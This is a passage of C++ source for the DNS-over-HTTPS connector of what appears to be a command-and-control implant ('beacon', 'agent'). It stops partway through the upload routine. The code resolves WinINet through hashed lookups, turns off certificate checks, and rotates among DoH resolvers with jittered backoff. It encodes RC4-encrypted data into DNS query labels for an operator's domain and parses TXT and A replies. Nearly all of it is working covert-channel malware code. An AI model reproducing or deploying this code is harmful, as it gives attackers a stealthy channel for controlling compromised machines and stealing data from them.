#include "ConnectorDoH.h"
#include "DnsUtils.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

// DNS utility functions are now in DnsUtils.h/cpp

// -----------------------------------------------------------------------------
// ConnectorDoH Implementation
// -----------------------------------------------------------------------------

static void DohConnectorLog(const char* msg)
{
	if (!msg) return;

	// Relative timestamp since first log (approx. since agent start)
	static DWORD s_startTick = 0;
	DWORD now = GetTickCount();
	if (s_startTick == 0)
		s_startTick = now;
	DWORD delta = now - s_startTick;

	CHAR line[1024] = { 0 };
	_snprintf(line, sizeof(line), "[%08lu ms] %s", (unsigned long)delta, msg);

	CHAR path[MAX_PATH] = {0};
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	if (len == 0 || len >= MAX_PATH)
		return;

	for (int i = (int)len - 1; i >= 0; --i) {
		if (path[i] == '\\' || path[i] == '/') {
			path[i + 1] = '\0';
			break;
		}
	}
	const CHAR logName[] = "ax_doh_beacon.log";
	SIZE_T dirLen = lstrlenA(path);
	if (dirLen + sizeof(logName) >= MAX_PATH)
		return;
	lstrcatA(path, logName);

	HANDLE hFile = CreateFileA(path,
		FILE_APPEND_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	DWORD written = 0;
	SIZE_T mlen = lstrlenA(line);
	if (mlen)
		WriteFile(hFile, line, (DWORD)mlen, &written, NULL);
	CHAR crlf[] = "\r\n";
	WriteFile(hFile, crlf, 2, &written, NULL);
	CloseHandle(hFile);
}

ConnectorDoH::ConnectorDoH()
{
	DohConnectorLog("[DoH] Ctor: start");

    this->functions = (DOH_HTTP_FUNC*) ApiWin->LocalAlloc(LPTR, sizeof(DOH_HTTP_FUNC) );
    if (!this->functions) {
        DohConnectorLog("[DoH] Ctor: LocalAlloc for DOH_HTTP_FUNC failed");
        return;
    }
    DohConnectorLog("[DoH] Ctor: LocalAlloc OK");
    
    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
    this->functions->LocalFree    = ApiWin->LocalFree;
    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
    this->functions->GetLastError = ApiWin->GetLastError;

    HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll" );
    if (!hWininetModule) {
        DohConnectorLog("[DoH] Ctor: LoadLibraryA(wininet.dll) failed");
        return;
    }
    DohConnectorLog("[DoH] Ctor: wininet.dll loaded");

    	if ( hWininetModule )
	{
		this->functions->InternetOpenA           = (decltype(InternetOpenA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA        = (decltype(InternetConnectA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA        = (decltype(HttpOpenRequestA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA        = (decltype(HttpSendRequestA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA      = (decltype(InternetSetOptionA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA    = (decltype(InternetQueryOptionA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA          = (decltype(HttpQueryInfoA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle     = (decltype(InternetCloseHandle)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile        = (decltype(InternetReadFile)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);

		if ( !this->functions->InternetOpenA || !this->functions->InternetConnectA || !this->functions->HttpOpenRequestA || !this->functions->HttpSendRequestA || !this->functions->InternetReadFile )
		{
			DohConnectorLog("[DoH] Ctor: WinINet symbols missing");
		}
		else {
			DohConnectorLog("[DoH] Ctor: WinINet symbols resolved");
			CHAR dbg[256];
			_snprintf(dbg, sizeof(dbg),
				"[DoH] Ctor: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
				this,
				this->functions,
				this->functions->LocalAlloc,
				this->functions->InternetOpenA,
				this->functions->InternetConnectA,
				this->functions->HttpOpenRequestA,
				this->functions->HttpSendRequestA,
				this->functions->InternetReadFile);
			DohConnectorLog(dbg);
		}

    }
}

ConnectorDoH::~ConnectorDoH()
{
}

BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
{
    // Verify WinINet APIs are loaded
    if (!this->functions || !this->functions->InternetOpenA || !this->functions->HttpSendRequestA) {
        DohConnectorLog("[DoH] SetConfig: WinINet functions missing");
        return FALSE;
    }

    this->profile = profile;

    // encrypt_key is a 16-byte RC4 session key, not a null-terminated string.
    // Always copy the full 16 bytes instead of using StrLenA, which may walk
    // past the buffer or stop early on random zeros.
    if (profile.encrypt_key) {
        memcpy(this->encryptKey, profile.encrypt_key, 16);
    }

    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000) this->pktSize = 64000;

    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63) this->labelSize = 48;

    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    this->urlCount = 0;
    if (profile.urls && profile.urls[0]) {
        lstrcpynA(this->rawUrls, (CHAR*)profile.urls, sizeof(this->rawUrls));
        
        // Split by comma
        CHAR* p = this->rawUrls;
        CHAR* start = p;
        while (*p) {
            if (*p == ',') {
                *p = '\0';
                if (this->urlCount < 16) {
                    // Trim leading spaces
                    while (*start == ' ') start++;
                    if (*start) this->urlList[this->urlCount++] = start;
                }
                start = p + 1;
            }
            p++;
        }
        // Last entry
        if (this->urlCount < 16) {
             while (*start == ' ') start++;
             if (*start) this->urlList[this->urlCount++] = start;
        }
    }
    
    // Fallback: If no URLs provided, use Google DNS as default
    if (this->urlCount == 0) {
        DohConnectorLog("[DoH] SetConfig: urlCount=0, fallback to https://dns.google/dns-query");
        CHAR defaultUrl[] = "https://dns.google/dns-query";
        lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
        this->urlList[0] = this->rawUrls;
        this->urlCount = 1;
    }
    
    // Reset per-provider health state and choose an initial index for stickiness
    for (ULONG i = 0; i < 16; ++i) {
        this->urlFailCount[i] = 0;
        this->urlDisabledUntil[i] = 0;
    }
    if (this->urlCount > 0) {
        this->currentUrlIndex = GetTickCount() % this->urlCount;
    }

    if (!beat || !beatSize || beatSize < 8) {
        DohConnectorLog("[DoH] SetConfig: invalid beat (null or too small)");
        return FALSE;
    }

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy) {
        DohConnectorLog("[DoH] SetConfig: MemAllocLocal for beatCopy failed");
        return FALSE;
    }
    memcpy(beatCopy, beat, beatSize);

    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    		if (beat && beatSize) {
			this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
			if (this->hiBeat) {
				memcpy(this->hiBeat, beat, beatSize);
				this->hiBeatSize = beatSize;
				this->hiRetries  = 3;
				this->hiSent     = FALSE;
				this->hiRetryDelayMs = 0;
				this->hiNextAttemptTick = 0;
			}
		}

	this->initialized = TRUE;
	{
		CHAR dbg[256];
		_snprintf(dbg, sizeof(dbg),
			"[DoH] SetConfig: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
			this,
			this->functions,
			this->functions ? this->functions->LocalAlloc : NULL,
			this->functions ? this->functions->InternetOpenA : NULL,
			this->functions ? this->functions->InternetConnectA : NULL,
			this->functions ? this->functions->HttpOpenRequestA : NULL,
			this->functions ? this->functions->HttpSendRequestA : NULL,
			this->functions ? this->functions->InternetReadFile : NULL);
		DohConnectorLog(dbg);
	}
	DohConnectorLog("[DoH] SetConfig: OK (initialized)");
	return TRUE;
}

void ConnectorDoH::CloseConnector()
{
    if (this->recvData) {
        this->functions->LocalFree(this->recvData);
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
    }
    if (this->downBuf) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf = NULL;
        this->downTotal = 0;
        this->downFilled = 0;
    }
    if (this->hConnect) {
        this->functions->InternetCloseHandle(this->hConnect);
        this->hConnect = NULL;
    }
    if (this->hInternet) {
        this->functions->InternetCloseHandle(this->hInternet);
        this->hInternet = NULL;
    }
}

void ConnectorDoH::UpdateUrls(BYTE* urls)
{
	this->profile.urls = urls;

	this->urlCount = 0;
	ZeroMemory(this->rawUrls, sizeof(this->rawUrls));
	for (ULONG i = 0; i < 16; ++i) {
		this->urlList[i] = NULL;
		this->urlFailCount[i] = 0;
		this->urlDisabledUntil[i] = 0;
	}

	if (urls && urls[0]) {
		lstrcpynA(this->rawUrls, (CHAR*)urls, sizeof(this->rawUrls));
		CHAR* p = this->rawUrls;
		CHAR* start = p;
		while (*p) {
			if (*p == ',') {
				*p = '\0';
				if (this->urlCount < 16) {
					while (*start == ' ')
						start++;
					if (*start)
						this->urlList[this->urlCount++] = start;
				}
				start = p + 1;
			}
			p++;
		}
		if (this->urlCount < 16) {
			while (*start == ' ')
				start++;
			if (*start)
				this->urlList[this->urlCount++] = start;
		}
	}

	if (this->urlCount == 0) {
		CHAR defaultUrl[] = "https://dns.google/dns-query";
		lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
		this->urlList[0] = this->rawUrls;
		this->urlCount = 1;
	}

	if (this->urlCount > 0) {
		this->currentUrlIndex = GetTickCount() % this->urlCount;
	}
}

// -----------------------------------------------------------------------------
// DoH Network Logic
// -----------------------------------------------------------------------------

BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** outData, ULONG* outLen)
{
    *outData = NULL;
    *outLen = 0;

	if (!this->functions) {
		DohConnectorLog("[DoH] HTTP: functions == NULL");
		return FALSE;
	}
	if (!this->functions->LocalAlloc ||
		!this->functions->InternetOpenA ||
		!this->functions->InternetConnectA ||
		!this->functions->HttpOpenRequestA ||
		!this->functions->HttpSendRequestA ||
		!this->functions->InternetReadFile) {
		DohConnectorLog("[DoH] HTTP: critical WinINet pointers missing");
		CHAR dbg[256];
		_snprintf(dbg, sizeof(dbg),
			"[DoH] HTTP: funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
			this->functions,
			this->functions->LocalAlloc,
			this->functions->InternetOpenA,
			this->functions->InternetConnectA,
			this->functions->HttpOpenRequestA,
			this->functions->HttpSendRequestA,
			this->functions->InternetReadFile);
		DohConnectorLog(dbg);
		return FALSE;
	}

	DohConnectorLog("[DoH] HTTP: PerformHttpRequest enter");
	if (qname) DohConnectorLog(qname);

    // 1. Construct DNS Wire Format Query
    const int kDnsQueryMax = 4096;
    BYTE* query = (BYTE*)this->functions->LocalAlloc(LPTR, kDnsQueryMax);
    if (!query) {
        DohConnectorLog("[DoH] HTTP: LocalAlloc failed for DNS query buffer");
        return FALSE;
    }

    USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
    query[0] = (BYTE)(id >> 8);
    query[1] = (BYTE)(id & 0xFF);
    query[2] = 0x01; // recursion desired
    query[5] = 0x01; // QDCOUNT = 1

    	int offset = 12;
    // 留出至少 4 字节给 QTYPE/QCLASS
    if (offset >= kDnsQueryMax - 4) {
        this->functions->LocalFree(query);
        return FALSE;
    }

    	int nameLen = DnsEncodeName(qname, query + offset, kDnsQueryMax - offset - 4);
    if (nameLen < 0) {
        this->functions->LocalFree(query);
        return FALSE;
    }
    offset += nameLen;
	{
		CHAR dbg[96];
		_snprintf(dbg, sizeof(dbg), "[DoH] HTTP: nameLen=%d offset=%d", nameLen, offset);
		DohConnectorLog(dbg);
	}

    	// 确保还有空间写入 QTYPE/QCLASS
	if (offset + 4 > kDnsQueryMax) {
		this->functions->LocalFree(query);
		return FALSE;
	}
	query[offset++] = (BYTE)((qtype >> 8) & 0xFF);
	query[offset++] = (BYTE)(qtype & 0xFF);
	query[offset++] = 0x00; query[offset++] = 0x01; // IN

    // -------------------------------------------------------------------------
    // EDNS0 OPT RR (Type 41) - Maximize Downlink Packet Size
    // -------------------------------------------------------------------------
    // Name: Root (0)
    // Type: 41 (OPT)
    // Class: 4096 (UDP Payload Size)
    // TTL: 0 (Ext RCODE, Version, Flags)
    // RdLen: 0
    // -------------------------------------------------------------------------
    // 需要 11 个字节空间写 OPT RR
    if (offset + 11 <= kDnsQueryMax) {
        query[offset++] = 0x00;             // Name (.)
        query[offset++] = 0x00; query[offset++] = 0x29; // Type 41
        query[offset++] = 0x10; query[offset++] = 0x00; // Class: 4096
        query[offset++] = 0x00; query[offset++] = 0x00; // TTL
        query[offset++] = 0x00; query[offset++] = 0x00; 
        query[offset++] = 0x00; query[offset++] = 0x00; // RdLen: 0

        // Update ARCOUNT in Header (Bytes 10, 11)
        query[11] = 0x01; 
    }

    if (!this->hInternet) {
        DohConnectorLog("[DoH] HTTP: InternetOpenA start");
        this->hInternet = this->functions->InternetOpenA(
            (CHAR*)(this->profile.user_agent ? this->profile.user_agent : "Mozilla/5.0"), 
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!this->hInternet) {
            DohConnectorLog("[DoH] HTTP: InternetOpenA failed");
        } else {
            DohConnectorLog("[DoH] HTTP: InternetOpenA OK");
        }
    }
    if (!this->hInternet) {
        this->functions->LocalFree(query);
        return FALSE;
    }

    if (this->urlCount == 0) {
        this->functions->LocalFree(query);
        return FALSE;
    }

    // Rotation Loop
    for (ULONG i = 0; i < this->urlCount; ++i) {
        ULONG idx = (this->currentUrlIndex + i) % this->urlCount;
        CHAR* targetUrl = this->urlList[idx];
        if (!targetUrl || !*targetUrl) continue;
        ULONG nowTick = GetTickCount();
        if (this->urlDisabledUntil[idx] && nowTick < this->urlDisabledUntil[idx]) {
            continue;
        }
        DohConnectorLog("[DoH] HTTP: using URL");
        DohConnectorLog(targetUrl);

        CHAR hostName[256] = {0};
        CHAR urlPath[256] = {0};
        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        BOOL isSecure = TRUE;

        CHAR* p = targetUrl;
        if (strstr(p, "https://") == p) {
            p += 8;
            isSecure = TRUE;
        } else if (strstr(p, "http://") == p) {
            p += 7;
            isSecure = FALSE;
            port = INTERNET_DEFAULT_HTTP_PORT;
        }

        CHAR* slash = strchr(p, '/');
        if (slash) {
            int hLen = (int)(slash - p);
            if (hLen > 255) hLen = 255;
            memcpy(hostName, p, hLen);
            lstrcpynA(urlPath, slash, sizeof(urlPath));
        } else {
            lstrcpynA(hostName, p, sizeof(hostName));
            lstrcpynA(urlPath, "/", sizeof(urlPath));
        }

        CHAR* colon = strchr(hostName, ':');
        if (colon) {
            *colon = 0;
            port = (INTERNET_PORT)atoi(colon + 1);
        }

        // Always create a new connection handle for rotation
        if (this->hConnect) {
            this->functions->InternetCloseHandle(this->hConnect);
            this->hConnect = NULL;
        }

        this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!this->hConnect) {
            DohConnectorLog("[DoH] HTTP: InternetConnectA failed, rotating URL");
            this->urlFailCount[idx]++;
            if (this->urlFailCount[idx] >= 3) {
                ULONG backoff = 60000;
                ULONG jitter = GetTickCount() & 0x1FFF;
                this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                this->urlFailCount[idx] = 0;
            }
            continue;
        }

        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES;
        if (isSecure) flags |= INTERNET_FLAG_SECURE;

        HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            DohConnectorLog("[DoH] HTTP: HttpOpenRequestA failed, rotating URL");
            this->urlFailCount[idx]++;
            if (this->urlFailCount[idx] >= 3) {
                ULONG backoff = 60000;
                ULONG jitter = GetTickCount() & 0x1FFF;
                this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                this->urlFailCount[idx] = 0;
            }
            continue;
        }

        if (isSecure) {
            DWORD dwFlags;
            DWORD dwBuffer = sizeof(DWORD);
            if (this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer)) {
                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
                this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            }
        }

        CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message";
        BOOL res = this->functions->HttpSendRequestA(hRequest, headers, (DWORD)StrLenA(headers), query, offset);
        
        if (res) {
            // Robust Check: Status Code
            DWORD statusCode = 0;
            DWORD scSize = sizeof(statusCode);
            if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &scSize, NULL)) {
                if (statusCode == 200) {
                    // Robust Check: Content-Type (optional but good)
                    // Skip for now to save bytes, 200 + valid DNS body check later is enough.
                    
                    BYTE* respBuf = NULL;
                    DWORD respSize = 0;
                    DWORD dwSize = 0;
                    DWORD dwDownloaded = 0;
                    BOOL readSuccess = TRUE;

                    do {
                        if (!this->functions->InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)) {
                            DohConnectorLog("[DoH] HTTP: InternetQueryDataAvailable failed");
                            readSuccess = FALSE; break; 
                        }
                        if (dwSize == 0) break;
                        
                        BYTE* newBuf = (BYTE*)this->functions->LocalAlloc(LPTR, respSize + dwSize);
                        if (!newBuf) {
                            DohConnectorLog("[DoH] HTTP: LocalAlloc failed while extending respBuf");
                            readSuccess = FALSE;
                            break;
                        }
                        if (respBuf) {
                            memcpy(newBuf, respBuf, respSize);
                            this->functions->LocalFree(respBuf);
                        }
                        respBuf = newBuf;

                        if (this->functions->InternetReadFile(hRequest, respBuf + respSize, dwSize, &dwDownloaded)) {
                            respSize += dwDownloaded;
                        } else {
                            DohConnectorLog("[DoH] HTTP: InternetReadFile failed");
                            readSuccess = FALSE; break;
                        }
                    } while (dwSize > 0);

                    if (readSuccess && respBuf && respSize > 0) {
                        CHAR dbg[96];
                        _snprintf(dbg, sizeof(dbg), "[DoH] HTTP: respSize=%lu", (unsigned long)respSize);
                        DohConnectorLog(dbg);
                        // Success! Update current index
                        this->currentUrlIndex = idx;
                        this->urlFailCount[idx] = 0;
                        this->urlDisabledUntil[idx] = 0;
                        *outData = respBuf;
                        *outLen = respSize;
                        this->functions->InternetCloseHandle(hRequest);
                        this->functions->LocalFree(query);
                        return TRUE;
                    }
                    
                    if (respBuf) this->functions->LocalFree(respBuf);
                } else {
                    DohConnectorLog("[DoH] HTTP: statusCode != 200");
                }
            }
        }

        this->functions->InternetCloseHandle(hRequest);
    }

    this->functions->LocalFree(query);
	
	// All providers failed for this request: reset WinINet handles so that
	// future attempts can rebuild connections and pick up any network changes.
	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}
	this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
	
	return FALSE;
}

BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    BYTE* respData = NULL;
    ULONG respLen = 0;

    // Default to failure until we successfully parse at least one TXT answer.
    this->lastQueryOk = FALSE;

    if (!PerformHttpRequest(qname, 0x0010, &respData, &respLen)) {
        DohConnectorLog("[DoH] DohQueryTxt: PerformHttpRequest FAILED");
        return FALSE;
    }

    // Safe parsing of DNS response
    if (respLen < 12) {
        DohConnectorLog("[DoH] DohQueryTxt: respLen too small for header");
        this->functions->LocalFree(respData);
        return FALSE;
    }

    BYTE* resp = respData;
    int qdcount = (resp[4] << 8) | resp[5];
    int ancount = (resp[6] << 8) | resp[7];
    int maxLen = (int)respLen;
    int pos = 12;

    // Skip question section safely
    for (int qi = 0; qi < qdcount; ++qi) {
        // Skip QNAME
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                // compression pointer
                if (pos + 1 >= maxLen) {
                    DohConnectorLog("[DoH] DohQueryTxt: question name ptr truncated");
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            // label length + content
            if (pos + 1 + lab > maxLen) {
                DohConnectorLog("[DoH] DohQueryTxt: question label exceeds buffer");
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }
        // Skip QTYPE + QCLASS
        if (pos + 4 > maxLen) {
            DohConnectorLog("[DoH] DohQueryTxt: question tail truncated");
            this->functions->LocalFree(respData);
            return FALSE;
        }
        pos += 4;
    }

    BOOL found = FALSE;
    for (int ai = 0; ai < ancount; ++ai) {
        if (pos >= maxLen) break;

        // Skip answer name
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                if (pos + 1 >= maxLen) {
                    DohConnectorLog("[DoH] DohQueryTxt: answer name ptr truncated");
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            if (pos + 1 + lab > maxLen) {
                DohConnectorLog("[DoH] DohQueryTxt: answer label exceeds buffer");
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }

        // Need TYPE(2)+CLASS(2)+TTL(4)+RDLEN(2)
        if (pos + 10 > maxLen) break;
        USHORT type = (resp[pos] << 8) | resp[pos + 1];
        USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
        pos += 10;
        if (pos + rdlen > maxLen) {
            DohConnectorLog("[DoH] DohQueryTxt: RDLEN exceeds buffer");
            break;
        }

        if (type == 16) { // TXT
            USHORT consumed = 0;
            ULONG written = 0;
            while (consumed < rdlen) {
                if (pos + consumed >= maxLen) break;
                BYTE txtLen = resp[pos + consumed];
                consumed++;
                if (consumed + txtLen > rdlen) {
                    // malformed inner length, stop
                    break;
                }
                if (txtLen > 0) {
                    if (written + txtLen <= outBufSize) {
                        memcpy(outBuf + written, resp + pos + consumed, txtLen);
                        written += txtLen;
                    } else {
                        // output buffer full
                        break;
                    }
                }
                consumed += txtLen;
            }
            if (written > 0) {
                *outSize = written;
                found = TRUE;
                this->lastQueryOk = TRUE;
            }
        }

        pos += rdlen;
    }

    this->functions->LocalFree(respData);
    return found;
}

BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    BYTE* respData = NULL;
    ULONG respLen = 0;

    // Default to failure until we successfully parse an A record.
    this->lastQueryOk = FALSE;

    if (!PerformHttpRequest(qname, 0x0001, &respData, &respLen)) {
        DohConnectorLog("[DoH] DohQueryA: PerformHttpRequest FAILED");
        return FALSE;
    }

    // Basic DNS header check
    if (respLen < 12) {
        DohConnectorLog("[DoH] DohQueryA: respLen too small for header");
        this->functions->LocalFree(respData);
        return FALSE;
    }

    BYTE* resp = respData;
    int qdcount = (resp[4] << 8) | resp[5];
    int ancount = (resp[6] << 8) | resp[7];
    int maxLen = (int)respLen;
    int pos = 12;

    // Skip questions
    for (int qi = 0; qi < qdcount; ++qi) {
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                if (pos + 1 >= maxLen) {
                    DohConnectorLog("[DoH] DohQueryA: question name ptr truncated");
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            if (pos + 1 + lab > maxLen) {
                DohConnectorLog("[DoH] DohQueryA: question label exceeds buffer");
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }
        if (pos + 4 > maxLen) {
            DohConnectorLog("[DoH] DohQueryA: question tail truncated");
            this->functions->LocalFree(respData);
            return FALSE;
        }
        pos += 4;
    }

    BOOL found = FALSE;
    for (int ai = 0; ai < ancount && pos + 10 <= maxLen; ++ai) {
        // Skip NAME (labels or pointer)
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                if (pos + 1 >= maxLen) {
                    DohConnectorLog("[DoH] DohQueryA: answer name ptr truncated");
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            if (pos + 1 + lab > maxLen) {
                DohConnectorLog("[DoH] DohQueryA: answer label exceeds buffer");
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }

        if (pos + 10 > maxLen)
            break;
        USHORT type = (resp[pos] << 8) | resp[pos + 1];
        USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
        pos += 10;
        if (pos + rdlen > maxLen) {
            DohConnectorLog("[DoH] DohQueryA: RDLEN exceeds buffer");
            break;
        }

        if (type == 1 && rdlen >= 4) { // A
            if (outBufSize >= 4) {
                memcpy(outBuf, resp + pos, 4);
                *outSize = 4;
                found = TRUE;
                this->lastQueryOk = TRUE;
            }
            break;
        }
        pos += rdlen;
    }

    this->functions->LocalFree(respData);
    return found;
}

// SendData / Receive Logic (HI + upload + downlink reassembly)
// -----------------------------------------------------------------------------

void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
{
	// Base packet size used for logical DNS frames over DoH
	ULONG pkt = this->pktSize ? this->pktSize : 1024;
	if (pkt > 64000)
		pkt = 64000;

	CHAR dataLabel[1024] = { 0 };
	CHAR qname[512] = { 0 };

	// -------------------------------------------------------------------------
	// 1. HI Phase: first call with non-empty data sends a small beat
	// -------------------------------------------------------------------------
	if (!this->hiSent && data && data_size) {
		DohConnectorLog("[DoH] SendData: HI phase start");
		// 60 bytes raw -> 96 chars Base32. With prefix + domain this keeps
		// QNAME well under the 253-byte DNS limit.
		const ULONG maxSafeFrame = 60;
		ULONG maxBuf = pkt;
		if (maxBuf > maxSafeFrame)
			maxBuf = maxSafeFrame;
		if (data_size && maxBuf > data_size)
			maxBuf = data_size;
		{
			CHAR dbg[128];
			_snprintf(dbg, sizeof(dbg), "[DoH] HI: pkt=%lu data=%lu maxBuf=%lu", (unsigned long)pkt, (unsigned long)data_size, (unsigned long)maxBuf);
			DohConnectorLog(dbg);
		}
		if (maxBuf == 0) {
			DohConnectorLog("[DoH] SendData: HI maxBuf == 0, skipping HI");
			this->hiSent = TRUE; // avoid looping forever
		}
		else {
			BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
			if (!encBuf)
				return;
			memcpy(encBuf, data, maxBuf);
			memset(dataLabel, 0, sizeof(dataLabel));
			if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
				MemFreeLocal((LPVOID*)&encBuf, maxBuf);
				return;
			}
			MemFreeLocal((LPVOID*)&encBuf, maxBuf);

			// Cache original HI beat for smart retries
			this->hiBeatSize = maxBuf;
			if (!this->hiBeat) {
				this->hiBeat = (BYTE*)MemAllocLocal(this->hiBeatSize);
				if (this->hiBeat)
					memcpy(this->hiBeat, data, this->hiBeatSize);
			}

			DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
			BYTE tmp[512];
			ULONG tmpSize = 0;
			if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
				this->hiSent = TRUE;
			}
			else if (this->hiRetries > 0) {
				this->hiRetries--;
			}
		}
		return;
	}

	// -------------------------------------------------------------------------
	// 2. Upload path: data present => PUT-like behavior with framing
	//    frame = [4 bytes total_len][4 bytes offset][chunk...]
	// -------------------------------------------------------------------------
	if (data && data_size) {
		const ULONG headerSize = 8;
		ULONG total = data_size;
		ULONG maxChunk = pkt;
		if (maxChunk <= headerSize)
			maxChunk = headerSize + 1;
		maxChunk -= headerSize;

		// Enforce QNAME length safety via maxSafeFrame
		const ULONG maxSafeFrame = 60;
		if (maxChunk + headerSize > maxSafeFrame)
			maxChunk = maxSafeFrame - headerSize;

		// Upper bound to avoid excessive memory use
